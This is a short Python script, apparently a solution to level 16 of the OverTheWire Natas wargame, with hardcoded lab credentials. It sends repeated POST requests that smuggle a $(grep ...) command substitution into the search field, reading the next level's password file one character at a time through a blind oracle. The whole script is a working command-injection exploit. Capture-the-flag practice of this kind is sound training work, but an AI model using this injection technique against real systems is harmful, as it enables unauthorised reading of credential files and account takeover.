import requests
import re
import string

username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'

url = f"http://{username}.natas.labs.overthewire.org/"

#response = requests.post(url, auth = (username, password), data = {"needle": "explosions$(grep -E ^a /etc/natas_webpass/natas17)"}, )

#print(response.text)

letters = string.ascii_letters + string.digits
nataspass = ''

while len(nataspass) < 32:
	for char in letters:
		print(f"Attempting password: {nataspass}{char}")
		response = requests.post(url, auth = (username, password), data = {"needle": "explosions$(grep -E ^" + nataspass + char + ".* /etc/natas_webpass/natas17)"}, )
		if "explosions" not in response.text:
			nataspass += char
			print(nataspass)
			break